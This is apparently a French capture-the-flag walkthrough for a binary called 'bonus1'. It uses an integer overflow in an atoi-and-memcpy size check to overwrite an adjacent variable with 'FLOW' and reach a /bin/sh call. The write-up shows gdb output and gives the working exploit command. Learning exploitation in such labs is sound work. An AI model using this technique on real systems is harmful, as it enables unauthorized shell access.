comparaison résultat atoi < 9
si oui memcpy avec size = 4 * resultat atoi
sinon return
atoi overflow ?
si input > 2147483647 => input = 2147483647
par contre si input < 0 => input = 0

plus loin dans le code on voit que l'argument passé en paramètre est réutilisé pour set la taille du memcpy

si arg = -1 => buffer size = 4294967292

si arg = -1073741808 => buffer size = 64

execl à la fin du programme avec pour argument :
execl("/bin/sh", "sh",0)

on accède à ce bout de code uniquement si la variable déclarée après le buffer est égale à 0x574f4c46

début du buffer : 0xbffff654

Après le memcpy notre variable est comparée avec la valeur 0x574f4c46

(gdb) b *main+84
Breakpoint 1 at 0x8048478

(gdb) r -1073741808 $(python -c 'print "A" * 64')
Starting program: /home/user/bonus1/bonus1 -1073741808 $(python -c 'print "A" * 63')

Breakpoint 1, 0x08048478 in main ()

(gdb) x/s $esp+0x3c
0xbffff69c:	 'A' <repeats 23 times>

on voit que notre variable a pour valeur 23A

la taille du buffer est donc de 40 et la valeur de notre variable est stockée ensuite.

il faut donc pouvoir remplir le buffer puis remplir la variable qui suit avec la valeur 0x574f4c46 => \x46\x4c\x4f\x57
il faut un buffer de taille minimum 44 (40 pour le buffer et 4 pour la valeur à assigner)

./bonus1 -1073741813 $(python -c 'print "\x41" * 40 + "\x46\x4c\x4f\x57"')

à noter qu'on pourrait prendre un buffer plus grand tant qu'on écrit au même endroit

aussi la string "FLOW" = 0x574f4c46 donc possibilité de deuxième argument :

    $(python -c 'print "\x41" * 40 + "FLOW"')
